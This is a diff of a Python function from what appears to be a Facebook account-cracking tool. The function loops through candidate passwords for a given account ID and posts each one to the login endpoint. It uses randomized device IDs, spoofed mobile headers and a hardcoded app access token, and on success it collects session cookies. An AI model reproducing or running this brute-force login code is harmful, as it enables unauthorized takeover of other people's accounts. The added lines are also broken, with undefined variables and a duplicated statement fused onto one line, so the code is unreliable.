@@ -933,50 +933,50 @@ def m1(idf,pwv):
     try:
       for pw in pwv:
             data = {
-            "email":idf,
-            "password":pw,
-            "adid": str(uuid.uuid4()),
-            "device_id": str(uuid.uuid4()),
-            "family_device_id": str(uuid.uuid4()),
+            'adid':str(uuid.uuid4()),
+            'format':'json',
+            'device':str(uuid.uuid4()),
+            'device_id':str(uuid.uuid4()),
+            'email':ids,
+            'password':pas,
+            "logged_out_id": str(uuid.uuid4()),
+            "hash_id": str(uuid.uuid4()),
+            "reg_instance": str(uuid.uuid4()),
             "session_id": str(uuid.uuid4()),
             "advertiser_id": str(uuid.uuid4()),
-            "reg_instance": str(uuid.uuid4()),
-            "logged_out_id": str(uuid.uuid4()),
-            "locale": "en_US",
-            "client_country_code": "US",
-            "cpl": "true",
-            "source": "login",
-            "format": "json",
-            "omit_response_on_success": "false",
-            "credentials_type": "password",
-            "error_detail_type": "button_with_disabled",
-            "generate_session_cookies": "1",
-            "generate_analytics_claim": "1",
-            "generate_machine_id": "1",
-            "tier": "regular",
-            "currently_logged_in_userid" : "0",
-            "fb_api_req_friendly_name": "authenticate",
-            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
-            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
-            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
-            "api_key": "882a8490361da98702bf97a021ddc14d",
-            "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
-            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
+            'generate_analytics_claims':'1',
+            'credentials_type':'password',
+            'source':'login',
+            "sim_country": "id",
+            "network_country": "id",
+            "relative_url": "method/auth.login",
+            'error_detail_type':'button_with_disabled',
+            'enroll_misauth':'false',
+            'generate_session_cookies':'1',
+            'generate_machine_id':'1',
+            "locale":"en_US","client_country_code":"US",
+            'fb_api_req_friendly_name':'authenticate',
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
+            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
             head = {
-            "User-Agent": ua_api(),
-            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
-            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-            "X-FB-Connection-Quality": "EXCELLENT",
-            "X-FB-Connection-Type": "MOBILE.LTE",
-            "X-FB-HTTP-Engine": "Liger",
-            'X-FB-Client-IP': 'True',
-            "X-FB-Friendly-Name": "authenticate",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Content-Length": str(len(content_lenght))}
-            url = "https://graph.facebook.com/auth/login" 
+            "method": 'GET', 
+            "path": '/',
+            "scheme": 'https', 
+            "authority": 'p.facebook.com',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            "accept-language": 'en-US,en;q=0.9',
+            "cache-control": 'max-age=0',
+            "sec-ch-ua": '"Chromium";v="111", "Not(A:Brand";v="8"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": '"Android"',
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'none',
+            "sec-fetch-user": '?1',
+            "upgrade-insecure-requests": '1',
+            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
+            url ='https://m.facebook.com/auth/login'
+            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
             q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
